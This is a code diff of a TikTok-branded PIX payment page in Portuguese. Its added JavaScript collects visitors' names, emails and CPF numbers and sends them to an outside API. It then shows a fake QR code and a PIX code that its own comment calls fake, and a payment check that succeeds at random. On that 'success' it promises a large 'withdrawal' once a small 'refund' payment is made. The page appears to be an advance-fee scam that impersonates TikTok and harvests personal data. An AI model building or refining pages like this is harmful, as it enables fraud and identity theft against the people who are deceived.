@@ -309,7 +309,7 @@
                             <i class="fas fa-user-circle" style="color: #FF0050; margin-right: 0.5rem;"></i>
                             Nome Completo *
                         </label>
-                        <input type="text" id="customerName" class="form-input" placeholder="Seu nome completo" required>
+                        <input type="text" id="nome-completo" class="form-input" placeholder="Seu nome completo" required>
                     </div>
                     
                     <div class="form-group">
@@ -317,7 +317,7 @@
                             <i class="fas fa-envelope" style="color: #FF0050; margin-right: 0.5rem;"></i>
                             E-mail *
                         </label>
-                        <input type="email" id="customerEmail" class="form-input" placeholder="seu@email.com" required>
+                        <input type="email" id="email-cliente" class="form-input" placeholder="seu@email.com" required>
                     </div>
                     
                     <div class="form-group">
@@ -325,7 +325,7 @@
                             <i class="fas fa-id-card" style="color: #FF0050; margin-right: 0.5rem;"></i>
                             CPF *
                         </label>
-                        <input type="text" id="customerCpf" class="form-input" placeholder="000.000.000-00" maxlength="14" required>
+                        <input type="text" id="cpf-cliente" class="form-input" placeholder="000.000.000-00" maxlength="14" required>
                     </div>
                     
                     <button type="submit" id="pay-button" class="btn btn-primary" style="margin-top: 1.5rem;">
@@ -567,59 +567,320 @@
     </div>
 
     <script>
-  const form = document.getElementById('paymentForm');
-  const resultDiv = document.getElementById('resultado');
+        // Variáveis globais
+        let currentSlide = 0;
+        const totalSlides = 4;
+        
+        // URL DA API REAL
+        const API_URL = 'https://tiktok-pix-real.onrender.com/api/pix/create';
 
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-
-    resultDiv.innerHTML = 'Gerando PIX... ⏳';
-
-    const nome = document.getElementById('nome').value;
-    const email = document.getElementById('email').value;
-    const cpf = document.getElementById('cpf').value;
-
-    try {
-      const response = await fetch('/api/pix/create', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          customerName: nome,
-          customerEmail: email,
-          customerCpf: cpf
-        })
-      });
-
-      const data = await response.json();
-
-      if (!data.success) {
-        resultDiv.innerHTML = 'Erro ao gerar PIX ❌';
-        return;
-      }
-
-      const pix = data.pix;
-
-      resultDiv.innerHTML = `
-        <h3>PIX gerado com sucesso ✅</h3>
-
-        <p><strong>Valor:</strong> R$ ${(pix.amount / 100).toFixed(2)}</p>
-
-        ${pix.qrcode_image
-          ? `<img src="${pix.qrcode_image}" width="250" />`
-          : ''
+        // Funções do carrossel
+        function moveCarousel(direction) {
+            const track = document.getElementById('carouselTrack');
+            const dots = document.querySelectorAll('.carousel-dot');
+            
+            currentSlide += direction;
+            
+            if (currentSlide < 0) {
+                currentSlide = totalSlides - 1;
+            } else if (currentSlide >= totalSlides) {
+                currentSlide = 0;
+            }
+            
+            track.style.transform = `translateX(-${currentSlide * 100}%)`;
+            
+            // Atualiza dots
+            dots.forEach((dot, index) => {
+                dot.classList.toggle('active', index === currentSlide);
+            });
+        }
+        
+        function goToSlide(index) {
+            currentSlide = index;
+            const track = document.getElementById('carouselTrack');
+            const dots = document.querySelectorAll('.carousel-dot');
+            
+            track.style.transform = `translateX(-${currentSlide * 100}%)`;
+            
+            // Atualiza dots
+            dots.forEach((dot, i) => {
+                dot.classList.toggle('active', i === currentSlide);
+            });
         }
 
-        <p><strong>Copia e Cola:</strong></p>
-        <textarea rows="4" style="width:100%">${pix.qrcode}</textarea>
-      `;
+        // Função para formatar CPF
+        function formatarCPF(cpf) {
+            cpf = cpf.replace(/\D/g, '');
+            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
 
-    } catch (error) {
-      resultDiv.innerHTML = 'Erro de conexão ❌';
-      console.error(error);
-    }
-  });
-</script>
+        // Máscara para CPF
+        document.getElementById('cpf-cliente')?.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            
+            if (value.length > 11) {
+                value = value.substring(0, 11);
+            }
+            
+            if (value.length > 9) {
+                value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+            } else if (value.length > 6) {
+                value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
+            } else if (value.length > 3) {
+                value = value.replace(/(\d{3})(\d{1,3})/, '$1.$2');
+            }
+            
+            e.target.value = value;
+        });
+
+        // Função para mostrar/ocultar steps
+        function showStep(stepId) {
+            // Oculta todos os steps
+            document.querySelectorAll('.form-step').forEach(step => {
+                step.classList.remove('active');
+            });
+            
+            // Mostra o step solicitado
+            const stepElement = document.getElementById(stepId);
+            if (stepElement) {
+                stepElement.classList.add('active');
+                
+                // Rola para o topo do step
+                stepElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            }
+        }
+
+        // Função principal para gerar PIX real
+        async function gerarPixReal(nome, email, cpf) {
+            // Validação básica
+            if (!nome || nome.trim().length < 3) {
+                alert('Por favor, informe seu nome completo!');
+                return null;
+            }
+            
+            if (!email || !email.includes('@') || !email.includes('.')) {
+                alert('Por favor, informe um e-mail válido!');
+                return null;
+            }
+            
+            cpf = cpf.replace(/\D/g, '');
+            if (cpf.length !== 11) {
+                alert('Por favor, informe um CPF válido com 11 dígitos!');
+                return null;
+            }
+            
+            try {
+                // Mostra loading
+                showStep('loading');
+                
+                const resposta = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        customerName: nome.trim(),
+                        customerEmail: email.trim(),
+                        customerCpf: cpf
+                    })
+                });
+                
+                const resultado = await resposta.json();
+                
+                if (resultado.success && resultado.transaction) {
+                    return resultado.transaction;
+                } else {
+                    alert('❌ Erro ao gerar PIX: ' + (resultado.error || 'Tente novamente'));
+                    showStep('step1');
+                    return null;
+                }
+            } catch (error) {
+                console.error('Erro na API:', error);
+                alert('❌ Erro de conexão com o servidor. Tente novamente.');
+                showStep('step1');
+                return null;
+            }
+        }
+
+        // Função para criar QR Code visual
+        function criarQRCodeVisual(transactionId) {
+            const qrContainer = document.getElementById('qrCodeContainer');
+            qrContainer.innerHTML = '';
+            
+            // Cria um QR Code simples com CSS (apenas visual)
+            const qrSize = 180;
+            const qrCanvas = document.createElement('div');
+            qrCanvas.style.width = `${qrSize}px`;
+            qrCanvas.style.height = `${qrSize}px`;
+            qrCanvas.style.backgroundColor = 'white';
+            qrCanvas.style.position = 'relative';
+            qrCanvas.style.margin = '0 auto';
+            
+            // Adiciona alguns quadrados para simular QR Code
+            for (let i = 0; i < 25; i++) {
+                const square = document.createElement('div');
+                square.style.position = 'absolute';
+                square.style.backgroundColor = '#000';
+                square.style.width = '8px';
+                square.style.height = '8px';
+                
+                const x = 20 + (i % 5) * 16;
+                const y = 20 + Math.floor(i / 5) * 16;
+                square.style.left = `${x}px`;
+                square.style.top = `${y}px`;
+                qrCanvas.appendChild(square);
+            }
+            
+            // Adiciona logo do PIX no centro
+            const pixLogo = document.createElement('div');
+            pixLogo.style.position = 'absolute';
+            pixLogo.style.top = '50%';
+            pixLogo.style.left = '50%';
+            pixLogo.style.transform = 'translate(-50%, -50%)';
+            pixLogo.style.fontSize = '24px';
+            pixLogo.style.fontWeight = 'bold';
+            pixLogo.style.color = '#00F2EA';
+            pixLogo.textContent = 'PIX';
+            qrCanvas.appendChild(pixLogo);
+            
+            qrContainer.appendChild(qrCanvas);
+        }
+
+        // Função para iniciar timer
+        function iniciarTimer(minutos = 30) {
+            let segundos = minutos * 60;
+            const timerElement = document.getElementById('timeLeft');
+            const progressElement = document.getElementById('progress');
+            
+            const interval = setInterval(() => {
+                segundos--;
+                
+                if (segundos < 0) {
+                    clearInterval(interval);
+                    timerElement.textContent = '00:00';
+                    progressElement.style.width = '0%';
+                    
+                    // Mostra alerta de expiração
+                    const statusElement = document.getElementById('paymentStatus');
+                    statusElement.innerHTML = '<i class="fas fa-clock"></i> Código PIX expirado';
+                    statusElement.className = 'status status-pending';
+                    
+                    return;
+                }
+                
+                const minutosRestantes = Math.floor(segundos / 60);
+                const segundosRestantes = segundos % 60;
+                
+                timerElement.textContent = 
+                    `${minutosRestantes.toString().padStart(2, '0')}:${segundosRestantes.toString().padStart(2, '0')}`;
+                
+                // Atualiza progresso
+                const progresso = (segundos / (minutos * 60)) * 100;
+                progressElement.style.width = `${progresso}%`;
+                
+            }, 1000);
+            
+            return interval;
+        }
+
+        // Evento de submit do formulário
+        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Coleta dados
+            const nome = document.getElementById('nome-completo').value;
+            const email = document.getElementById('email-cliente').value;
+            const cpf = document.getElementById('cpf-cliente').value;
+            
+            // Gera PIX real
+            const transaction = await gerarPixReal(nome, email, cpf);
+            
+            if (transaction) {
+                // Atualiza a interface com os dados do PIX
+                document.getElementById('orderId').textContent = `#${transaction.id || 'PIX' + Date.now().toString().slice(-6)}`;
+                
+                // Cria QR Code visual
+                criarQRCodeVisual(transaction.id);
+                
+                // Gera código PIX falso para demonstração
+                const pixCodeFake = `00020126580014BR.GOV.BCB.PIX0136${Date.now()}520400005303986540521.675802BR5900TikTok Pay6009SAO PAULO62140510${transaction.id || 'PIX123'}6304`;
+                document.getElementById('pixCode').textContent = pixCodeFake;
+                
+                // Inicia timer
+                iniciarTimer(30);
+                
+                // Mostra step do PIX
+                showStep('pixPayment');
+                
+                // Abre QR Code em nova janela se tiver URL
+                if (transaction.pix_url) {
+                    setTimeout(() => {
+                        window.open(transaction.pix_url, 'PIX_TIKTOK', 'width=400,height=600');
+                    }, 1000);
+                }
+            }
+        });
+
+        // Botão copiar código PIX
+        document.getElementById('copy-button').addEventListener('click', function() {
+            const pixCodeText = document.getElementById('pixCode').textContent;
+            
+            if (pixCodeText && pixCodeText !== 'Aguardando geração...') {
+                navigator.clipboard.writeText(pixCodeText).then(() => {
+                    // Feedback visual
+                    const originalText = this.innerHTML;
+                    this.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
+                    this.style.background = 'linear-gradient(135deg, #00F2EA, #00C2B8)';
+                    
+                    setTimeout(() => {
+                        this.innerHTML = originalText;
+                        this.style.background = '';
+                    }, 2000);
+                }).catch(err => {
+                    console.error('Erro ao copiar:', err);
+                    alert('Erro ao copiar código. Selecione e copie manualmente.');
+                });
+            }
+        });
+
+        // Botão verificar pagamento
+        document.getElementById('checkPaymentBtn').addEventListener('click', function() {
+            const statusElement = document.getElementById('paymentStatus');
+            
+            // Simula verificação
+            statusElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando pagamento...';
+            
+            setTimeout(() => {
+                // Simula pagamento pendente (na vida real aqui você faria uma chamada à API)
+                const pagamentoConfirmado = Math.random() > 0.7; // 30% chance de sucesso
+                
+                if (pagamentoConfirmado) {
+                    statusElement.innerHTML = '<i class="fas fa-check-circle"></i> Pagamento confirmado!';
+                    statusElement.className = 'status status-success';
+                    
+                    // Simula processamento do reembolso
+                    setTimeout(() => {
+                        alert('✅ Pagamento confirmado! Seu reembolso de R$ 21,67 será processado em 1 minuto e seu saque de R$ 4.596,72 será liberado.');
+                    }, 500);
+                } else {
+                    statusElement.innerHTML = '<i class="fas fa-clock"></i> Aguardando pagamento...';
+                    statusElement.className = 'status status-pending';
+                    alert('⏳ Pagamento ainda não identificado. Aguarde alguns minutos e tente novamente.');
+                }
+            }, 2000);
+        });
+
+        // Botão novo pagamento
+        document.getElementById('newPaymentBtn').addEventListener('click', function() {
+            if (confirm('Deseja gerar um novo código PIX?')) {
+                showStep('step1');
+            }
+        });
+
+        // Auto-inicia o carrossel
+        setInterval(() => {
+            moveCarousel(1);
+        }, 5000);
+    </script>
 </body>
 </html>
